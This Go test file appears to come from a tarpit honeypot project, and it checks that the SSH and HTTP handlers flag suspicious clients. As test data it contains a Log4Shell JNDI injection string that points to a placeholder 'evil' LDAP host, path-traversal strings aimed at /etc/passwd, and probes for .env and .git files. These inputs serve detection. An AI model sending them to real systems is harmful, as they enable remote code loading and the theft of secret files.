package handler

import (
	"bufio"
	"context"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/config"
)

// An SSH client that sends a non-printable identification string is
// almost certainly fuzzer/non-SSH; flag it.
func TestSSHFlagsNonPrintableClientID(t *testing.T) {
	client, server := pipePair(t)
	cfg := config.Listener{Handler: "ssh", ReadTimeout: time.Second}
	done := make(chan struct{})
	var res Result
	go func() {
		defer close(done)
		res, _ = (&ssh{}).Handle(context.Background(), server, cfg)
	}()
	br := bufio.NewReader(client)
	_, _ = br.ReadString('\n')
	// Send binary garbage instead of a real SSH-2.0 line.
	_, _ = client.Write([]byte{0x00, 0x01, 0x02, 0x03, 0x04, '\n'})
	client.Close()
	<-done
	anoms, _ := res.Meta["anomalies"].([]string)
	found := false
	for _, a := range anoms {
		if a == "ssh-id-non-printable" || a == "ssh-id-not-ssh" {
			found = true
		}
	}
	if !found {
		t.Errorf("anomalies = %v; want ssh-id-non-printable", anoms)
	}
}

// HTTP request with method "ATTACK" should produce http-method-unknown.
func TestHTTPFlagsUnknownMethod(t *testing.T) {
	client, server := pipePair(t)
	cfg := config.Listener{Handler: "http", ReadBytes: 1024, ReadTimeout: time.Second}
	done := make(chan struct{})
	var res Result
	go func() {
		defer close(done)
		res, _ = (&httpH{}).Handle(context.Background(), server, cfg)
	}()
	_, _ = client.Write([]byte("ATTACK / HTTP/1.1\r\nHost: x\r\n\r\n"))
	buf := make([]byte, 1024)
	_, _ = client.Read(buf)
	client.Close()
	<-done
	anoms, _ := res.Meta["anomalies"].([]string)
	if !containsStr(anoms, "http-method-unknown") {
		t.Errorf("expected http-method-unknown in anomalies; got %v", anoms)
	}
}

// HTTP request hitting a Log4Shell-style URI should flag
// uri-log4shell-jndi even though we don't model the vulnerability.
func TestHTTPFlagsLog4ShellURI(t *testing.T) {
	client, server := pipePair(t)
	cfg := config.Listener{Handler: "http", ReadBytes: 4096, ReadTimeout: time.Second}
	done := make(chan struct{})
	var res Result
	go func() {
		defer close(done)
		res, _ = (&httpH{}).Handle(context.Background(), server, cfg)
	}()
	_, _ = client.Write([]byte("GET /test?x=${jndi:ldap://evil/} HTTP/1.1\r\nHost: x\r\n\r\n"))
	buf := make([]byte, 4096)
	_ = client.SetReadDeadline(time.Now().Add(time.Second))
	_, _ = client.Read(buf)
	client.Close()
	<-done
	anoms, _ := res.Meta["anomalies"].([]string)
	if !containsStr(anoms, "uri-log4shell-jndi") {
		t.Errorf("expected uri-log4shell-jndi in anomalies; got %v", anoms)
	}
}

// flagAnomaly should not duplicate the same marker.
func TestFlagAnomalyIdempotent(t *testing.T) {
	res := &Result{}
	flagAnomaly(res, "foo")
	flagAnomaly(res, "foo")
	flagAnomaly(res, "bar")
	list, _ := res.Meta["anomalies"].([]string)
	if len(list) != 2 {
		t.Errorf("dedup broken: %v", list)
	}
}

// suspiciousURI must catch path traversal across both encoded and
// unencoded forms.
func TestSuspiciousURI(t *testing.T) {
	cases := map[string]string{
		"/etc/../etc/passwd":      "uri-path-traversal",
		"/etc/..%2fpasswd":        "uri-path-traversal",
		"/wp-admin/admin-ajax.php": "uri-wordpress-probe",
		"/.git/config":            "uri-source-leak-probe",
		"/manager/html":           "uri-mgmt-endpoint-probe",
		"/.env":                   "uri-secret-file-probe",
	}
	for in, want := range cases {
		if got := suspiciousURI(in); got != want {
			t.Errorf("suspiciousURI(%q) = %q; want %q", in, got, want)
		}
	}
	if got := suspiciousURI("/normal/page"); got != "" {
		t.Errorf("suspiciousURI(normal) = %q; want empty", got)
	}
}

func containsStr(list []string, s string) bool {
	for _, item := range list {
		if item == s {
			return true
		}
	}
	return false
}

// Make sure no test ever sees a connection-reset error from net.Pipe
// when the server side closes after writing its response.
func TestPipePairWorks(t *testing.T) {
	c, s := pipePair(t)
	go func() { c.Write([]byte("hi")); c.Close() }()
	buf := make([]byte, 8)
	n, _ := s.Read(buf)
	if string(buf[:n]) != "hi" {
		t.Errorf("pipe pair broken: %q", string(buf[:n]))
	}
	_ = net.IPv4zero // silence unused import in some builds
	_ = strings.Contains
}
